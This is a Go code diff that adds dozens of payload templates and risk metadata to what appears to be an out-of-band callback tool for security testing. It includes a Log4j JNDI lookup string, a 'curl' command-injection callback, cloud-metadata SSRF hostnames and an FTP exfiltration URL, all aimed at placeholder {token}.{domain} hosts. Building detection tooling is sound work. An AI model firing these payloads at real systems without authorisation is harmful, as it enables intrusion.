@@ -80,13 +80,268 @@ const (
 	PayloadStatusRevoked = "revoked"
 )
 
-// PayloadTemplates defines available payload templates
+// TemplateMetadata describes a payload template's category and risk level.
+type TemplateMetadata struct {
+	Name        string `json:"name"`
+	Description string `json:"description"`
+	Category    string `json:"category"`
+	Risk        string `json:"risk"`
+}
+
+// PayloadTemplates defines available payload templates using {variable} substitution syntax.
 var PayloadTemplates = map[string]string{
-	"ssrf-basic":    "http://{token}.{domain}/",
-	"xxe-basic":     "http://{token}.{domain}/xxe",
-	"rce-basic":     "http://{token}.{domain}/cmd",
-	"blind-sqli":    "http://{token}.{domain}/sql?id=1",
-	"dns-rebinding": "http://{token}.{domain}/rebind",
+	// SSRF
+	"ssrf-basic":          "http://{token}.{domain}/",
+	"ssrf-redirect":       "http://{token}.{domain}/redirect",
+	"ssrf-cloud-metadata": "{token}.169.254.169.254.{domain}",
+	"ssrf-aws-metadata":   "169.254.169.254.{token}.{domain}",
+	"ssrf-gcp-metadata":   "metadata.google.internal.{token}.{domain}",
+	"ssrf-azure-metadata": "169.254.169.254.{token}.{domain}",
+
+	// XXE / Injection
+	"xxe-basic":             "http://{token}.{domain}/xxe",
+	"rfi-remote-file":       "http://{token}.{domain}/file.php",
+	"file-inclusion":        "http://{token}.{domain}/include",
+	"blind-sqli":            "http://{token}.{domain}/sql?id=1",
+	"blind-sqli-dns":        "{token}.{domain}",
+	"ssti-template":         "{token}.{domain}",
+	"template-injection":    "{token}.{domain}",
+	"prototype-pollution":   "{token}.{domain}",
+	"host-header-injection": "{token}.{domain}",
+	"log4j-jndi":            "${jndi:ldap://{token}.{domain}/exp}",
+	"yaml-deserialization":  "http://{token}.{domain}/yaml",
+	"deserialization":       "http://{token}.{domain}/object",
+	"ldap-injection":        "{token}.{domain}",
+
+	// RCE
+	"rce-basic":   "http://{token}.{domain}/cmd",
+	"rce-command": "curl http://{token}.{domain}",
+
+	// Client-side
+	"cors-jsonp":         "http://{token}.{domain}/callback",
+	"pdf-html-rendering": "http://{token}.{domain}/resource",
+	"xss-reflected":      "http://{token}.{domain}/xss",
+
+	// API
+	"webhook":               "https://{token}.{domain}/webhook",
+	"graphql-introspection": "{token}.{domain}",
+
+	// DevOps
+	"ci-cd-variable": "{token}.{domain}",
+
+	// Network
+	"dns-rebinding":     "http://{token}.{domain}/rebind",
+	"smb-relay":         "{token}.{domain}",
+	"ftp-exfil":         "ftp://{token}.{domain}/data",
+	"request-smuggling": "{token}.{domain}",
+
+	// SMTP
+	"smtp-injection": "{token}@{domain}",
+
+	// Auth
+	"jwt-confusion": "{token}.{domain}",
+}
+
+// PayloadTemplateMetadata provides metadata for each template ID.
+var PayloadTemplateMetadata = map[string]TemplateMetadata{
+	"ssrf-basic": {
+		Name:        "SSRF HTTP",
+		Description: "Server-Side Request Forgery detection via HTTP",
+		Category:    "ssrf",
+		Risk:        "high",
+	},
+	"ssrf-redirect": {
+		Name:        "SSRF Redirect",
+		Description: "Open redirect via SSRF",
+		Category:    "ssrf",
+		Risk:        "high",
+	},
+	"ssrf-cloud-metadata": {
+		Name:        "SSRF Cloud Metadata",
+		Description: "Cloud metadata endpoint detection",
+		Category:    "ssrf",
+		Risk:        "critical",
+	},
+	"ssrf-aws-metadata": {
+		Name:        "SSRF AWS Metadata",
+		Description: "AWS EC2 metadata endpoint",
+		Category:    "ssrf",
+		Risk:        "critical",
+	},
+	"ssrf-gcp-metadata": {
+		Name:        "SSRF GCP Metadata",
+		Description: "Google Cloud Platform metadata",
+		Category:    "ssrf",
+		Risk:        "critical",
+	},
+	"ssrf-azure-metadata": {
+		Name:        "SSRF Azure Metadata",
+		Description: "Azure cloud metadata",
+		Category:    "ssrf",
+		Risk:        "critical",
+	},
+	"xxe-basic": {
+		Name:        "XXE External Entity",
+		Description: "XML External Entity injection",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"rfi-remote-file": {
+		Name:        "RFI Remote File Inclusion",
+		Description: "Remote File Inclusion detection",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"file-inclusion": {
+		Name:        "File Inclusion",
+		Description: "Local/Remote file inclusion",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"blind-sqli": {
+		Name:        "Blind SQLi HTTP",
+		Description: "Blind SQL injection via HTTP callback",
+		Category:    "sqli",
+		Risk:        "high",
+	},
+	"blind-sqli-dns": {
+		Name:        "Blind SQLi DNS",
+		Description: "Blind SQL injection via DNS exfiltration",
+		Category:    "sqli",
+		Risk:        "high",
+	},
+	"ssti-template": {
+		Name:        "SSTI Template Injection",
+		Description: "Server-Side Template Injection",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"template-injection": {
+		Name:        "Template Injection",
+		Description: "Jinja2/ERB/Freemarker template injection",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"prototype-pollution": {
+		Name:        "Prototype Pollution",
+		Description: "JavaScript prototype pollution",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"host-header-injection": {
+		Name:        "Host Header Injection",
+		Description: "Host header injection",
+		Category:    "injection",
+		Risk:        "medium",
+	},
+	"log4j-jndi": {
+		Name:        "Log4j JNDI",
+		Description: "Log4j JNDI injection",
+		Category:    "injection",
+		Risk:        "critical",
+	},
+	"yaml-deserialization": {
+		Name:        "YAML Deserialization",
+		Description: "YAML deserialization attack",
+		Category:    "injection",
+		Risk:        "critical",
+	},
+	"deserialization": {
+		Name:        "Deserialization",
+		Description: "Java/Python/PHP deserialization attack",
+		Category:    "injection",
+		Risk:        "critical",
+	},
+	"ldap-injection": {
+		Name:        "LDAP Injection",
+		Description: "LDAP query injection",
+		Category:    "injection",
+		Risk:        "high",
+	},
+	"rce-basic": {
+		Name:        "RCE Basic",
+		Description: "Remote Code Execution via HTTP callback",
+		Category:    "rce",
+		Risk:        "critical",
+	},
+	"rce-command": {
+		Name:        "RCE Command Injection",
+		Description: "Remote Code Execution via command injection",
+		Category:    "rce",
+		Risk:        "critical",
+	},
+	"cors-jsonp": {
+		Name:        "CORS/JSONP",
+		Description: "CORS misconfiguration and JSONP detection",
+		Category:    "misconfiguration",
+		Risk:        "medium",
+	},
+	"pdf-html-rendering": {
+		Name:        "PDF/HTML Rendering",
+		Description: "PDF or HTML rendering with external resources",
+		Category:    "client-side",
+		Risk:        "medium",
+	},
+	"xss-reflected": {
+		Name:        "XSS Reflected",
+		Description: "Reflected XSS detection",
+		Category:    "client-side",
+		Risk:        "medium",
+	},
+	"webhook": {
+		Name:        "Webhook",
+		Description: "Webhook endpoint detection",
+		Category:    "api",
+		Risk:        "low",
+	},
+	"graphql-introspection": {
+		Name:        "GraphQL Introspection",
+		Description: "GraphQL API introspection",
+		Category:    "api",
+		Risk:        "medium",
+	},
+	"ci-cd-variable": {
+		Name:        "CI/CD Variable",
+		Description: "CI/CD pipeline variable injection",
+		Category:    "devops",
+		Risk:        "high",
+	},
+	"dns-rebinding": {
+		Name:        "DNS Rebinding",
+		Description: "DNS rebinding attack for SSRF",
+		Category:    "network",
+		Risk:        "high",
+	},
+	"smb-relay": {
+		Name:        "SMB Relay",
+		Description: "SMB NTLM relay attack",
+		Category:    "network",
+		Risk:        "critical",
+	},
+	"ftp-exfil": {
+		Name:        "FTP Exfiltration",
+		Description: "FTP data exfiltration",
+		Category:    "network",
+		Risk:        "high",
+	},
+	"request-smuggling": {
+		Name:        "Request Smuggling",
+		Description: "HTTP request smuggling",
+		Category:    "network",
+		Risk:        "critical",
+	},
+	"smtp-injection": {
+		Name:        "SMTP Injection",
+		Description: "SMTP header injection",
+		Category:    "injection",
+		Risk:        "medium",
+	},
+	"jwt-confusion": {
+		Name:        "JWT Confusion",
+		Description: "JWT algorithm confusion",
+		Category:    "auth",
+		Risk:        "high",
+	},
 }
 
 // RenderTemplate renders a payload template with variables
